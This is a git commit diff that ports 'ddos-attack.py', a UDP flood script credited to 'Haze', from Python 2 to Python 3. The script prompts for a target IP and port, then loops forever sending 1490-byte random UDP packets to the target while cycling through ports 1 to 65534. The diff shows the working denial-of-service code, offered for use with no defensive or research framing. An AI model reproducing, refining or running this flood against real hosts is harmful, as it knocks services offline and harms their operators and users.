4ef03098ee5156b3419e1fb766a61d44a9e26377
maskedwrrg <127317838+maskedwrrg@users.noreply.github.com>
2023-07-20 10:17:10 -0400

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -17,32 +17,24 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : Haze"
-print
-ip = raw_input("IP Target : ")
+os.system("cls")
+print ("Author   : Haze")
+print("")
+print ("")
+print ("")
+print("-"*50)
+ip = input("IP Target : ")
 port = input("Port       : ")
+port = int(port)
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
+os.system("cls")
+print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
-
